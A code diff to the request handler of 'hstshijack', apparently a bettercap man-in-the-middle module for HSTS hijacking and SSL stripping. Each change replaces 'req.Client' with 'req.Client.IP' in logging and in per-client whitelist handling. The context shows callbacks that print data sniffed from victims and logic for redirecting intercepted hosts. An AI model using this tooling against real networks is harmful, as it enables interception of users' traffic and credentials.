@@ -362,7 +362,7 @@ function onRequest(req, res) {
 		// Requests made for this path will decode a base64 encoded hostname and send a HEAD request to this hostname in search for HTTPS redirects.
 		if (req.Path == "/" + ssl_log_path) {
 			queried_host = atob(req.Query)
-			log_debug(on_blue + "hstshijack" + reset + " Silent SSL log callback received from " + green + req.Client + reset + " for " + bold + queried_host + reset + ".")
+			log_debug(on_blue + "hstshijack" + reset + " Silent SSL log callback received from " + green + req.Client.IP + reset + " for " + bold + queried_host + reset + ".")
 			for (var i = 0; i < target_hosts.length; i++) {
 				var regexp
 				if ( target_hosts[i].indexOf("*") != -1 ) {
@@ -388,7 +388,7 @@ function onRequest(req, res) {
 		// Requests made for this path will print sniffed data.
 		// Requests made for this path will not be proxied.
 		if (req.Path == "/" + callback_path) {
-			log_info(on_blue + "hstshijack" + reset + " Silent callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
+			log_info(on_blue + "hstshijack" + reset + " Silent callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_grey + " " + reset + " \n  " + on_grey + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_grey + "CALLBACK" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_grey + " " + reset + " \n"
 
@@ -426,7 +426,7 @@ function onRequest(req, res) {
 		// Requests made for this path will not be proxied.
 		// Requests made for this path will stop all attacks towards this client for the requested hostname.
 		if (req.Path == "/" + whitelist_path) {
-			log_info(on_blue + "hstshijack" + reset + " Silent, whitelisting callback received from " + green + req.Client + reset + " for " + bold + req.Hostname + reset)
+			log_info(on_blue + "hstshijack" + reset + " Silent, whitelisting callback received from " + green + req.Client.IP + reset + " for " + bold + req.Hostname + reset)
 
 			var logStr = "\n  " + on_white + " " + reset + " \n  " + on_white + " " + reset + "  [" + green + "hstshijack.callback" + reset + "] " + on_white + "WHITELIST" + reset + " " + req.Scheme + "://" + req.Hostname + req.Path + (req.Query != "" ? ("?" + req.Query) : "") + "\n  " + on_white + " " + reset + " \n"
 
@@ -458,13 +458,13 @@ function onRequest(req, res) {
 
 			req.Scheme = "ignore"
 			// Add requested hostname (spoofed and/or original) to whitelist
-			if (whitelist[req.Client]) {
-				whitelisted_hosts = whitelist[req.Client].split(",")
+			if (whitelist[req.Client.IP]) {
+				whitelisted_hosts = whitelist[req.Client.IP].split(",")
 				if ( whitelisted_hosts.indexOf(req.Hostname) == -1 ) {
 					whitelisted_hosts += "," + req.Hostname
 				}
 			} else {
-				whitelist[req.Client] = req.Hostname
+				whitelist[req.Client.IP] = req.Hostname
 			}
 			// Also add (wildcard) targets and replacements for requested hostname
 			for (var i = 0; i < target_hosts.length; i++) {
@@ -478,8 +478,8 @@ function onRequest(req, res) {
 					regexp_replacements = toWholeRegexp(replacement_hosts[i])
 				}
 				if ( req.Hostname.match(regexp_targets) || req.Hostname.match(regexp_replacements) ) {
-					whitelist[req.Client] += "," + replacement_hosts[i]
-					whitelist[req.Client] += "," + target_hosts[i]
+					whitelist[req.Client.IP] += "," + replacement_hosts[i]
+					whitelist[req.Client.IP] += "," + target_hosts[i]
 				}
 			}
 		}
@@ -489,8 +489,8 @@ function onRequest(req, res) {
 	/* Attack or ignore request */
 
 		// Redirect client to the real host if a whitelist callback was received.
-		if (whitelist[req.Client]) {
-			whitelisted_hosts = whitelist[req.Client].split(",")
+		if (whitelist[req.Client.IP]) {
+			whitelisted_hosts = whitelist[req.Client.IP].split(",")
 			for (var a = 0; a < whitelisted_hosts.length; a++) {
 				var regexp
 				if ( whitelisted_hosts[a].indexOf("*") != -1 ) {
@@ -522,7 +522,7 @@ function onRequest(req, res) {
 					}
 					res.SetHeader("bettercap", "ignore")
 					ignored = true
-					log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
+					log_info(on_blue + "hstshijack" + reset + " Redirecting " + green + req.Client.IP + reset + " from " + bold + req.Hostname + reset + " to " + bold + intended_host + reset + " because we received a whitelist callback.")
 					break
 				}
 			}
